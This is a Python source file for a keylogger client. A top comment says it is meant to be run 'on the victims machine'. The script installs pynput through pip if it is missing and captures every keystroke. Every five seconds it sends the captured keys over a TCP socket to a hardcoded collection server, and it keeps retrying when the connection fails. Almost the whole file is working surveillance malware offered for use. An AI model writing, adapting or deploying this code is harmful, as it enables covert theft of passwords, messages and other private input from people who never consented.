#please change the server_ip variabale according to the your server ip before executing the client code on the victims machine

import socket
import time
import subprocess
from queue import Queue 
import threading
from pynput import keyboard

def install_pynput():
    try:
        subprocess.check_output(['pip', 'show', 'pynput'], stderr=subprocess.STDOUT)
        print("pynput library is already installed.")
    except subprocess.CalledProcessError:
        print("Installing pynput library...")
        try:
            subprocess.run(['pip', 'install', 'pynput'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, check=True)
            print("pynput library installed successfully.")
        except subprocess.CalledProcessError:
            print("Error installing the 'pynput' library.")

def on_press(key, data_queue):
    try:
        if key == keyboard.Key.space:
            data_to_send = ' '
        elif key == keyboard.Key.enter:
            data_to_send = '\n'
        elif key == keyboard.key.backspace:
            data_to_send = ''
        elif hasattr(key, 'char') and key.char.isnumeric():
            data_to_send = key.char
        else:
            data_to_send = str(key.char)

        data_queue.put(data_to_send)
    except:
        data_to_send = str(key)
        data_queue.put(data_to_send)

def keylogger_thread_func(data_queue):
    with keyboard.Listener(on_press=lambda key: on_press(key, data_queue)) as listener:
        listener.join()

def send_data_to_server(data):
    print(data)
    try:
        client_socket.send(data.encode('utf-8'))
    except (socket.error, BrokenPipeError) as e:
        print(f"Error sending data: {e}")
    except Exception as ex:
        print(f"Unexpected error: {ex}")


def connect_to_server(server_ip, server_port):
    try:
        global client_socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket.connect((server_ip, server_port))
        print(f"Connected to server at {server_ip}:{server_port}")
    except ConnectionRefusedError:
        print(f"Failed to connect to the server at {server_ip}:{server_port}. Retrying...")
        time.sleep(5)
        connect_to_server(server_ip, server_port)
    except KeyboardInterrupt:
        print("Terminating keylogger.")
        if client_socket:
            client_socket.close()
    except Exception as e:
        print(f"Error connecting to the server: {e}")
        if client_socket:
            client_socket.close()


def main():
    install_pynput()
    server_ip = '10.0.0.239'
    server_port = 12345
    data_queue = Queue()
    connect_to_server(server_ip, server_port)

    try:
        keylogger_thread = threading.Thread(target=keylogger_thread_func, args=(data_queue,))
        keylogger_thread.start()

        while True:
            time.sleep(5)
            recorded_data = ""
            while not data_queue.empty():
                recorded_data += data_queue.get()

            if recorded_data:
                send_data_to_server(recorded_data)

    except KeyboardInterrupt:
        print("Terminating keylogger.")
    finally:
        if client_socket:
            client_socket.close()


if __name__== "__main__":
    main()
